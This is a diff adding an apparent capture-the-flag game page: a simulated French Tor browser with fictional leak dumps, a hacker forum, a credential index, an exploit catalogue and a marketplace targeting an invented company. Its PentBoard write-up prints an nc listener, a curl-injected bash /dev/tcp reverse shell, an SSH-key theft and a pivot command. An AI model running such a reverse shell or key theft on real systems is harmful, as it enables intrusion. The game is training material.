+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ff9a44" stroke-width="1.6" width="32" height="32"><path d="M12 2C12 2 5 10 5 15a7 7 0 0 0 14 0C19 10 12 2 12 2z"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:#ff9a44">BLACKTIDE-LEAK v3.1</div>
+            <div class="doc-sub">dump exfiltré · partiellement déchiffré · 2026-03-29</div>
+          </div>
+        </div>
+        <div class="callout callout-info">
+          <span class="callout-icon">i</span>
+          <span>Ce dump provient d'une exfiltration de la partition <code>/ops</code>. Les hashes sont MD5 non salé. Accès réservé aux opérateurs clearance ≥ 1.</span>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Comptes opérateurs (clearance ≥ 1)</div>
+          <table class="data-table">
+            <thead><tr><th>Login</th><th>Email</th><th>Hash MD5</th><th>Clearance</th><th>Statut</th></tr></thead>
+            <tbody>
+              <tr><td class="hl-gold">n.morel</td><td>nicolas.morel@blacktide-corp.tld</td><td>a3f8d2…</td><td>2</td><td class="hl-orange">LEAKÉ</td></tr>
+              <tr><td>a.klein</td><td>alice.klein@blacktide-corp.tld</td><td>b9c11f…</td><td>1</td><td class="hl-orange">LEAKÉ</td></tr>
+              <tr><td>j.torres</td><td>jerome.torres@blacktide-corp.tld</td><td>d04e7a…</td><td>1</td><td class="hl-green">RÉVOQUÉ</td></tr>
+              <tr><td>svc-ops</td><td>ops@blacktide-corp.tld</td><td>????</td><td>2</td><td class="hl-red">ACTIF</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Clé SSH opérateur (accès restreint)</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">auto-exfil</span><span>batch 2026-03-29</span></div>
+            <p>Clé SSH opérateur <code>id_ops.leak</code> localisée dans <code>/home/blacktide-ops/keys/</code> sur le serveur gateway.</p>
+            <p style="margin-top:8px;color:var(--yellow)">La clé SSH n'est pas publiée ici — elle est accessible uniquement via accès direct au serveur BlackTide (reverse shell).</p>
+            <p style="margin-top:8px;color:var(--text3)">Après clearance OMEGA : reverse shell via <code>render.php</code> (voir PentBoard).</p>
+            <div class="tags"><span class="tag">ssh</span><span class="tag">bt-auth-4421</span></div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Tokens relay exfiltrés</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">relay_dump</span><span>2026-04-01</span></div>
+            <p>Jeton session relay : <code class="hl-gold">ops-sess-8842</code></p>
+            <p style="margin-top:6px">Upgrade key : <code class="hl-gold">1442-HTUA-TB:n.morel</code> → action=upgrade → clearance=2</p>
+            <div class="tags"><span class="tag">relay</span><span class="tag">clearance-2</span><span class="tag">actif</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── FORUM OPSDATA ─── -->
+    <div class="page" id="pg-forum">
+      <div class="doc-wrap">
+        <div class="doc-header">
+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#b39dfc" stroke-width="1.6" width="32" height="32"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:#b39dfc">OpsData Forum</div>
+            <div class="doc-sub">intelligence opérationnelle · membres vérifiés · v4.2</div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Thread #7782 — BlackTide Corp / Ops relay [PINNED]</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">omega_watcher</span><span>2026-04-23 02:41 UTC</span></div>
+            <p>Confirmé : alias <strong>n.morel</strong> actif sur la fenêtre <code>02:00–03:00 UTC</code>. Le relay monte un clearance 2 avec le bon upgrade key. J'ai le jeton.</p>
+            <div class="tags"><span class="tag">blacktide</span><span class="tag">relay</span><span class="tag">confirmed</span></div>
+          </div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">d4rkpr0be</span><span>2026-04-23 03:12 UTC</span></div>
+            <p>Pattern email actif : <code>prenom.nom@blacktide-corp.tld</code>. Les seeds <code>.local</code> sont des leurres — archives pré-2026 à ignorer.</p>
+            <div class="tags"><span class="tag">email</span><span class="tag">osint</span></div>
+          </div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">ghost_indexer</span><span>2026-04-24 11:07 UTC</span></div>
+            <p>Stack confirmée : <code>nginx/1.27 + php-fpm</code>. Mode legacy-mirror encore en prod. <code>action=mesh</code> renvoie l'inventaire interne si clearance ≥ 2.</p>
+            <div class="tags"><span class="tag">stack</span><span class="tag">legacy</span><span class="tag">mesh</span></div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Thread #5511 — ARCHIVE [non fiable]</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">old_leaker</span><span>2026-03-02 00:44 UTC</span></div>
+            <p style="color:var(--red)">! LEURRE confirmé : alias <strong>n.moreau</strong> et fenêtre <code>00:00–01:00 UTC</code> sont obsolètes. Ne pas utiliser.</p>
+            <div class="tags"><span class="tag" style="background:rgba(255,106,117,.12);color:var(--red)">obsolete</span><span class="tag" style="background:rgba(255,106,117,.12);color:var(--red)">leurre</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── PENTBOARD ─── -->
+    <div class="page" id="pg-pentboard">
+      <div class="doc-wrap">
+        <div class="doc-header">
+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#3fe1b0" stroke-width="1.6" width="32" height="32"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/><polyline points="6 8 9 11 6 14"/><line x1="12" y1="14" x2="16" y2="14"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:#3fe1b0">PentBoard</div>
+            <div class="doc-sub">pentesting · tools · exploits · write-ups</div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Write-up — Reverse shell + SSH pivot (2026-04-25)</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">r3dteam_x</span><span>2026-04-25</span><span style="color:#ff9a44">★ Top rated</span></div>
+            <p>Pré-requis : valider le ClearanceForm OMEGA (8 champs). Ensuite :</p>
+            <div class="codeblock">
+<span class="c-dim"># 1. Listener reverse shell (OMEGA Shell, panneau 1)</span>
+<span class="c-green">nc</span> -lvnp 4444
+
+<span class="c-dim"># 2. Déclencher la RCE render.php (panneau 2)</span>
+<span class="c-green">curl</span> <span class="c-yellow">'http://127.0.0.1:18081/internal/auth-gateway/v2/render.php?mode=legacy&amp;tpl=omega%2Frce&amp;cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F4444+0%3E%261'</span>
+
+<span class="c-dim"># 3. Shell reçu → récupérer la clé SSH</span>
+<span class="c-green">cat</span> /home/blacktide-ops/keys/id_ops.leak
+
+<span class="c-dim"># 4. SSH sur pivot avec la clé</span>
+<span class="c-green">ssh</span> -i ~/keys/id_ops.leak ops@pivot
+            </div>
+            <div class="tags"><span class="tag">rce</span><span class="tag">reverse-shell</span><span class="tag">bt-auth-4421</span><span class="tag">pivot</span></div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Write-up — Relay auth-gateway post-pivot</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">r3dteam_x</span><span>2026-04-25</span></div>
+            <div class="codeblock">
+<span class="c-dim"># Depuis ops@pivot</span>
+<span class="c-green">bash</span> ~/scripts/preflight-internal.sh
+<span class="c-green">bash</span> ~/scripts/preflight-internal.sh --deploy-consoles
+            </div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Outils recommandés</div>
+          <div class="card">
+            <p><strong style="color:var(--text)">Recon :</strong> <code>nmap -sV pivot</code> · <code>gobuster dir -u http://pivot/</code> · <code>theharvester -d blacktide-corp.tld</code></p>
+            <p style="margin-top:8px"><strong style="color:var(--text)">Exploitation :</strong> <code>curl</code> avec jar cookie pour <code>ops-relay.php</code></p>
+            <p style="margin-top:8px"><strong style="color:var(--text)">Post-exploit :</strong> <code>ssh ops@pivot</code> depuis OMEGA Shell après clearance 2</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── CREDDB ─── -->
+    <div class="page" id="pg-creddb">
+      <div class="doc-wrap">
+        <div class="doc-header">
+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ffd567" stroke-width="1.6" width="32" height="32"><ellipse cx="12" cy="6" rx="8" ry="3"/><path d="M4 6v6c0 1.7 3.6 3 8 3s8-1.3 8-3V6"/><path d="M4 12v6c0 1.7 3.6 3 8 3s8-1.3 8-3v-6"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:var(--yellow)">CredDB — Credential Database</div>
+            <div class="doc-sub">index de credentials exfiltrés · 2.3M entrées · MAJ 2026-04-28</div>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Résultats pour "blacktide"</div>
+          <table class="data-table">
+            <thead><tr><th>Source</th><th>Login</th><th>Domaine</th><th>Type</th><th>Date</th></tr></thead>
+            <tbody>
+              <tr><td>bt-ops-dump</td><td class="hl-gold">n.morel</td><td>blacktide-corp.tld</td><td>SSH + relay token</td><td>2026-03-29</td></tr>
+              <tr><td>bt-ops-dump</td><td>a.klein</td><td>blacktide-corp.tld</td><td>password hash MD5</td><td>2026-03-29</td></tr>
+              <tr><td>bt-partner-crawl</td><td>svc-relay</td><td>blacktide-corp.tld</td><td>service account</td><td>2026-04-01</td></tr>
+              <tr><td>email-harvest-2026</td><td>nicolas.morel</td><td>blacktide-corp.tld</td><td>email pattern</td><td>2026-04-22</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── VULNSEARCH ─── -->
+    <div class="page" id="pg-vulnsearch">
+      <div class="vs-wrap">
+        <div class="vs-header">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#3fe1b0" stroke-width="1.6" width="34" height="34"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/><path d="M8 11h6M11 8v6"/></svg>
+          <div>
+            <div class="vs-logo-txt">VulnSearch</div>
+            <div class="vs-logo-sub">exploit database · CVE index · PoC repository · 48 294 entrées</div>
+          </div>
+          <div style="margin-left:auto;display:flex;gap:6px;">
+            <span class="badge badge-ok">ONLINE</span>
+            <span class="badge badge-info">v6.4.1</span>
+          </div>
+        </div>
+        <div class="vs-search-row">
+          <input class="vs-search-input" id="vsSearchInput" type="text" spellcheck="false"
+                 placeholder="Rechercher CVE, logiciel, version, auteur… ex: nginx, render.php, CVE-2026" autocomplete="off" />
+        </div>
+        <div class="vs-filter-row" id="vsFilters">
+          <span class="vs-pill active" data-filter="all">Tous</span>
+          <span class="vs-pill" data-filter="Remote">Remote</span>
+          <span class="vs-pill" data-filter="Local">Local</span>
+          <span class="vs-pill" data-filter="WebApp">Web App</span>
+          <span class="vs-pill" data-filter="DoS">DoS</span>
+          <span class="vs-pill" data-filter="PHP">PHP</span>
+          <span class="vs-pill" data-filter="Linux">Linux</span>
+        </div>
+        <div class="vs-count" id="vsCount">Affichage de 16 entrées</div>
+        <table class="vs-table">
+          <thead>
+            <tr>
+              <th>EDB-ID</th><th>CVE / Ref</th><th>Description</th>
+              <th>Type</th><th>Platform</th><th>Date</th><th>Auteur</th><th></th>
+            </tr>
+          </thead>
+          <tbody id="vsBody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ─── MARKET ─── -->
+    <div class="page" id="pg-market">
+      <div class="mk-wrap">
+        <div class="doc-header">
+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ff9a44" stroke-width="1.6" width="32" height="32"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:var(--orange)">ZeroMarket</div>
+            <div class="doc-sub">marketplace anonyme · 1 247 annonces · escrow multisig · paiement XMR/BTC</div>
+          </div>
+          <div style="margin-left:auto;display:flex;gap:6px;align-items:flex-start">
+            <span class="badge badge-ok">4 128 membres</span>
+            <span class="badge badge-gold">Escrow v3</span>
+          </div>
+        </div>
+        <div class="mk-cats" id="mkCats">
+          <span class="mk-cat active" data-cat="all">Tout</span>
+          <span class="mk-cat" data-cat="access">Accès & Credentials</span>
+          <span class="mk-cat" data-cat="tools">Outils & Malware</span>
+          <span class="mk-cat" data-cat="data">Dumps & Data</span>
+          <span class="mk-cat" data-cat="vuln">Vulnérabilités</span>
+          <span class="mk-cat" data-cat="service">Services</span>
+        </div>
+        <div class="mk-grid" id="mkGrid"></div>
+      </div>
+    </div>
+
+    <!-- ─── PASTE ─── -->
+    <div class="page" id="pg-paste">
+      <div class="ps-wrap">
+        <div class="doc-header">
+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#b39dfc" stroke-width="1.6" width="32" height="32"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:#b39dfc">0xPaste — Anonymous Pastebin</div>
+            <div class="doc-sub">chiffrement E2E · auto-destruction · aucun log · v2.1</div>
+          </div>
+        </div>
+        <div class="callout callout-info">
+          <span class="callout-icon">i</span>
+          <span>Tous les pastes sont chiffrés côté client. L'opérateur ne peut pas lire le contenu. Les pastes publics ci-dessous sont volontairement non chiffrés.</span>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Pastes publics récents</div>
+          <div class="ps-list" id="psList"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── DYNAMIC ─── -->
+    <div class="page" id="pg-dynamic">
+      <div class="dyn-wrap" id="dynContent"></div>
+    </div>
+
+    <!-- ─── CLEARNET BLOCKED ─── -->
+    <div class="page" id="pg-clearnet">
+      <div class="clr-wrap">
+        <div class="clr-box">
+          <div class="clr-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="48" height="48"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+          </div>
+          <div class="clr-title">Accès clearnet bloqué</div>
+          <div class="clr-url" id="clrUrl">https://…</div>
+          <div class="clr-desc">TorBridge ne route pas le trafic clearnet (<code>http://</code> / <code>https://</code>).<br>
+          Seules les adresses <code>.onion</code> sont autorisées sur ce réseau.<br><br>
+          Votre anonymat aurait pu être compromis si la requête avait abouti.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── ERREUR ─── -->
+    <div class="page" id="pg-error">
+      <div class="err-wrap">
+        <div class="err-box">
+          <div class="err-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#ff6a75" stroke-width="1.5" width="52" height="52"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          </div>
+          <div class="err-title">Connexion refusée</div>
+          <div class="err-url" id="errUrl">onion://…</div>
+          <div class="err-desc">Cette adresse .onion est inaccessible via le réseau Tor.<br>
+          Le service est peut-être hors ligne ou l'adresse a changé.</div>
+          <div class="err-btns">
+            <button class="err-btn" id="errRetry">Réessayer</button>
+            <button class="err-btn primary" id="errHome">Accueil</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /viewport -->
+
+  <!-- Statusbar -->
+  <div class="statusbar">
+    <span class="status-tor" id="statusTor">TOR · Circuit 3 nœuds · latence 120ms</span>
+    <span class="status-ssl">TLS 1.3 · ECDHE-RSA-AES256 · HSTS</span>
+    <span class="status-url" id="statusMsg">Prêt</span>
+    <span class="status-dl" id="statusDl" style="display:none"></span>
+  </div>
+
+  <!-- Download bar -->
+  <div class="dl-bar" id="dlBar">
+    <div class="dl-item" id="dlItem">
+      <span class="dl-icon">&#8595;</span>
+      <span class="dl-name" id="dlName">fichier.txt</span>
+      <span class="dl-size" id="dlSize">0 KB</span>
+      <span class="dl-close" id="dlClose">&#10005;</span>
+    </div>
+  </div>
+
+</div><!-- /browser -->
+
+<!-- Context menu -->
+<div class="ctx-menu" id="ctxMenu">
+  <div class="ctx-item" id="ctxNewTab"><span>&#43;</span> Nouvel onglet</div>
+  <div class="ctx-item" id="ctxCopyUrl"><span>&#128203;</span> Copier l'adresse</div>
+  <div class="ctx-sep"></div>
+  <div class="ctx-item" id="ctxSaveAs">Enregistrer sous…</div>
+  <div class="ctx-item" id="ctxReload"><span>&#8635;</span> Actualiser</div>
+  <div class="ctx-sep"></div>
+  <div class="ctx-item disabled" id="ctxViewSrc">Afficher le source</div>
+  <div class="ctx-item" id="ctxCircuit">&#9679; Informations circuit Tor</div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ═══════════════════════════════════════════════════════════════
+     DONNÉES
+  ══════════════════════════════════════════════════════════════ */
+
+  var PAGES = {
+    loading:    { id:"pg-loading",    url:null,                                    title:"Chargement…",       favicon:"◌" },
+    newtab:     { id:"pg-newtab",     url:"tor://newtab",                          title:"Nouvel onglet",     favicon:"○" },
+    search:     { id:"pg-search",     url:null,                                    title:"HiddenSearch",      favicon:"#" },
+    "bt-corp":  { id:"pg-bt-corp",    url:"onion://bl4ckt1d3c0rp7x2m.onion",       title:"BlackTide Corp",    favicon:"■" },
+    "bt-leak":  { id:"pg-bt-leak",    url:"onion://bt7z4xkq3nwm2aic.onion",        title:"BlackTide Leak",    favicon:"◈" },
+    forum:      { id:"pg-forum",      url:"onion://hkrs4v7x9pqm3cft.onion",        title:"OpsData Forum",     favicon:"◉" },
+    pentboard:  { id:"pg-pentboard",  url:"onion://p3ntb0ard4h4ck3rs.onion",       title:"PentBoard",         favicon:"▶" },
+    creddb:     { id:"pg-creddb",     url:"onion://cr3d3ntl3ak9xz2r.onion",        title:"CredDB",            favicon:"≡" },
+    vulnsearch: { id:"pg-vulnsearch", url:"onion://s34rchspl01t7z9m.onion",        title:"VulnSearch",        favicon:"+" },
+    market:     { id:"pg-market",     url:"onion://z3r0m4rk3tx9vb2k.onion",        title:"ZeroMarket",        favicon:"$" },
+    paste:      { id:"pg-paste",      url:"onion://0xp4st34n0n7zk2r.onion",        title:"0xPaste",           favicon:"P" },
+    dynamic:    { id:"pg-dynamic",    url:null,                                    title:"…",                 favicon:"·" },
+    clearnet:   { id:"pg-clearnet",   url:null,                                    title:"Accès bloqué",      favicon:"!" },
+    error:      { id:"pg-error",      url:null,                                    title:"Erreur",            favicon:"!" },
+  };
+
+  var URL_MAP = {
+    "tor://newtab":                     "newtab",
+    "onion://bl4ckt1d3c0rp7x2m.onion":  "bt-corp",
+    "onion://bt7z4xkq3nwm2aic.onion":   "bt-leak",
+    "onion://hkrs4v7x9pqm3cft.onion":   "forum",
+    "onion://p3ntb0ard4h4ck3rs.onion":  "pentboard",
+    "onion://cr3d3ntl3ak9xz2r.onion":   "creddb",
+    "onion://s34rchspl01t7z9m.onion":   "vulnsearch",
+    "onion://z3r0m4rk3tx9vb2k.onion":   "market",
+    "onion://0xp4st34n0n7zk2r.onion":   "paste",
+  };
+
+  /* Alias pratiques pour la barre d'adresse */
+  var ALIASES = {
+    "searchsploit":  "vulnsearch",
+    "vulnsearch":    "vulnsearch",
+    "sploit":        "vulnsearch",
+    "market":        "market",
+    "zeromarket":    "market",
+    "paste":         "paste",
+    "0xpaste":       "paste",
+    "creddb":        "creddb",
+    "pentboard":     "pentboard",
+    "forum":         "forum",
+    "opsdata":       "forum",
+  };
+
+  var NT_SITES = [
+    { key:"bt-corp",   icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><rect x="3" y="9" width="18" height="12" rx="1"/><path d="M8 9V6a4 4 0 0 1 8 0v3"/></svg>', name:"BlackTide Corp",  url:"onion://bl4ckt1d3c0rp7x2m.onion" },
+    { key:"bt-leak",   icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><path d="M12 2C12 2 5 10 5 15a7 7 0 0 0 14 0C19 10 12 2 12 2z"/></svg>',             name:"BlackTide Leak",  url:"onion://bt7z4xkq3nwm2aic.onion" },
+    { key:"forum",     icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',  name:"Forum OpsData",   url:"onion://hkrs4v7x9pqm3cft.onion" },
+    { key:"pentboard", icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><rect x="2" y="3" width="20" height="14" rx="2"/><polyline points="6 8 9 11 6 14"/><line x1="12" y1="14" x2="16" y2="14"/></svg>', name:"PentBoard",    url:"onion://p3ntb0ard4h4ck3rs.onion" },
+    { key:"creddb",    icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><ellipse cx="12" cy="6" rx="8" ry="3"/><path d="M4 6v6c0 1.7 3.6 3 8 3s8-1.3 8-3V6"/><path d="M4 12v6c0 1.7 3.6 3 8 3s8-1.3 8-3v-6"/></svg>', name:"CredDB Leak", url:"onion://cr3d3ntl3ak9xz2r.onion" },
+    { key:"vulnsearch",icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="21" y2="21"/><path d="M8 11h6M11 8v6"/></svg>', name:"VulnSearch",  url:"onion://s34rchspl01t7z9m.onion" },
+    { key:"market",    icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>', name:"ZeroMarket", url:"onion://z3r0m4rk3tx9vb2k.onion" },
+    { key:"paste",     icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>', name:"0xPaste",     url:"onion://0xp4st34n0n7zk2r.onion" },
+    { key:"search",    icon:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="28" height="28"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="21" y2="21"/></svg>', name:"HiddenSearch",url:null, query:"blacktide morel" },
+  ];
+
+  var RESULTS = {
+    default: [
+      { key:"bt-corp",    title:"BlackTide Corporation — miroir anonyme",          desc:"Stack nginx/1.27, email pattern, opérateurs exposés, module auth-gateway v2. Réf. BT-AUTH-4421.", warn:null },
+      { key:"bt-leak",    title:"BlackTide Leak v3 — credentials dump 2026-03-29", desc:"n.morel clearance 2, path clé SSH /home/blacktide-ops/keys/, token relay ops-sess-8842. Réf. fournisseur BT-SUP-4421.", warn:"Données volées" },
+      { key:"forum",      title:"OpsData Forum — Thread #7782 BlackTide relay",    desc:"Alias n.morel, fenêtre 02h–03h UTC, upgrade key confirmé. Stack nginx/1.27 + php-fpm.", warn:null },
+      { key:"pentboard",  title:"PentBoard — Reverse shell + SSH pivot BlackTide", desc:"Flow : nc listener → curl RCE → cat id_ops.leak → ssh -i ops@pivot.", warn:null },
+      { key:"creddb",     title:"CredDB — index credentials blacktide-corp.tld",   desc:"4 entrées : n.morel SSH (bt-ops-dump), a.klein hash, svc-relay, nicolas.morel email.", warn:null },
+      { key:"vulnsearch", title:"VulnSearch — BT-AUTH-4421 render.php tpl inject", desc:"PoC publié pour l'injection tpl sur render.php (legacy-mirror). Fournisseur BT-SUP-4421.", warn:null },
+    ],
+    morel: [
+      { key:"bt-leak",   title:"n.morel — credentials leakés (BlackTide)",  desc:"Clearance 2 · SSH id_ops.leak · token relay ops-sess-8842 · upgrade key.", warn:null },
+      { key:"forum",     title:"OpsData Forum — alias n.morel confirmé",    desc:"Fenêtre 02:00–03:00 UTC. Upgrade key 1442-HTUA-TB:n.morel. Thread #7782.", warn:null },
+      { key:"creddb",    title:"CredDB — nicolas.morel@blacktide-corp.tld", desc:"Email pattern + SSH leak indexés. Clearance niveau 2.", warn:null },
+    ],
+    auth: [
+      { key:"bt-corp",    title:"BlackTide — /internal/auth-gateway/v2/",        desc:"Module legacy-mirror nginx/1.27 + php-fpm. Incident BT-AUTH-4421.", warn:null },
+      { key:"pentboard",  title:"PentBoard — Reverse shell + pivot flow",         desc:"Flow complet : nc listener + curl RCE + cat clé + ssh.", warn:null },
+      { key:"vulnsearch", title:"VulnSearch — EDB-2026-0037 render.php RCE",     desc:"Template injection → RCE · PoC complet · fournisseur BT-SUP-4421.", warn:null },
+      { key:"forum",      title:"OpsData Forum — relay auth-gateway",            desc:"Alias n.morel, fenêtre 02:00–03:00 UTC, upgrade key.", warn:null },
+    ],
+    leak: [
+      { key:"bt-leak",   title:"BlackTide Leak v3 — dump 2026-03-29", desc:"Credentials, clés SSH, tokens relay exfiltrés.", warn:"Données volées" },
+      { key:"creddb",    title:"CredDB — entrées blacktide-corp.tld",  desc:"4 entrées indexées.", warn:null },
+    ],
+    exploit: [
+      { key:"vulnsearch", title:"VulnSearch — exploit database (48K+ entrées)",   desc:"Base de données de PoC, CVE, writeups. Filtrage par type/platform/auteur.", warn:null },
+      { key:"pentboard",  title:"PentBoard — writeups reverse shell",              desc:"nc -lvnp 4444 → curl RCE → cat /home/blacktide-ops/keys/id_ops.leak", warn:null },
+    ],
+  };
+
+  /* ═══════════════════════════════════════════════════════════════
+     VULNSEARCH DATA
+  ══════════════════════════════════════════════════════════════ */
+
+  var VS_DATA = [
+    { id:"EDB-2026-0042", cve:"CVE-2026-3741",  desc:"nginx 1.27.x — Buffer Overflow in header parsing (ngx_http_parse)",        type:"Remote",  platform:"Linux/x64",  date:"2026-04-18", author:"nginx_corp",   verified:true,  dl:"nginx-1.27-bof.py"   },
+    { id:"EDB-2026-0039", cve:"CVE-2026-2918",  desc:"php-fpm 8.2.x — FCGI Remote Code Execution via env variable injection",    type:"Remote",  platform:"Linux",      date:"2026-04-14", author:"r3dteam_x",    verified:true,  dl:"phpfpm-rce.py"       },
+    { id:"EDB-2026-0037", cve:"BT-AUTH-4421",   desc:"render.php — Template Parameter Injection → Remote Code Execution (legacy-mirror module)", type:"Remote", platform:"PHP", date:"2026-04-12", author:"anon_s3c", verified:true, dl:"bt-auth4421-poc.sh", highlight:true },
+    { id:"EDB-2026-0031", cve:"CVE-2026-1882",  desc:"OpenSSH 9.6 — Signal Handler Race Condition (pre-auth)",                  type:"Remote",  platform:"Linux/Unix", date:"2026-03-29", author:"void_ptr",     verified:true,  dl:"ssh-race-poc.c"      },
+    { id:"EDB-2026-0028", cve:"CVE-2026-1447",  desc:"Linux Kernel 6.8 — UAF in netfilter nf_tables (local privilege escalation)",type:"Local",  platform:"Linux/x64",  date:"2026-03-21", author:"krnlz",        verified:true,  dl:"lpe-nftables.c"      },
+    { id:"EDB-2026-0026", cve:"CVE-2026-1204",  desc:"Apache Tomcat 11.x — Partial PUT Request Processing RCE",                 type:"Remote",  platform:"Java",       date:"2026-03-17", author:"apach3_pwn",   verified:false, dl:"tomcat-put.py"       },
+    { id:"EDB-2026-0024", cve:"CVE-2026-0998",  desc:"Apache mod_lua 2.4.59 — Integer Overflow in r:parsebody()",               type:"Remote",  platform:"Multi",      date:"2026-03-12", author:"ghost_idx",    verified:true,  dl:"mod_lua-iot.rb"      },
+    { id:"EDB-2026-0021", cve:"CVE-2026-0714",  desc:"jQuery 3.7.x — Prototype Pollution via $.extend() with __proto__",        type:"WebApp",  platform:"JavaScript", date:"2026-03-05", author:"d4rkpr0be",    verified:false, dl:"jquery-pp.js"        },
+    { id:"EDB-2026-0019", cve:"CVE-2026-0561",  desc:"Sudo 1.9.15 — Heap Overflow in IPv6 prefix parsing (ALL:ALL bypass)",    type:"Local",   platform:"Linux",      date:"2026-02-28", author:"privesc_42",   verified:true,  dl:"sudo-heap.c"         },
+    { id:"EDB-2026-0018", cve:"CVE-2026-0422",  desc:"Redis 7.2.x — ACL Bypass via RESET command on non-auth sessions",        type:"Remote",  platform:"Linux",      date:"2026-02-28", author:"mem0ry",       verified:true,  dl:"redis-acl.py"        },
+    { id:"EDB-2026-0016", cve:"CVE-2026-0104",  desc:"Docker API 26.x — Container Escape via Unauthorized UNIX Socket Access", type:"Remote",  platform:"Linux",      date:"2026-02-14", author:"c0ntain3r",    verified:false, dl:"docker-escape.sh"    },
+    { id:"EDB-2026-0014", cve:"CVE-2025-9871",  desc:"WordPress 6.6.x — SQLi via user-meta key in REST API endpoint",         type:"WebApp",  platform:"PHP/MySQL",  date:"2025-12-19", author:"wpsec_null",   verified:true,  dl:"wp-sqli.py"          },
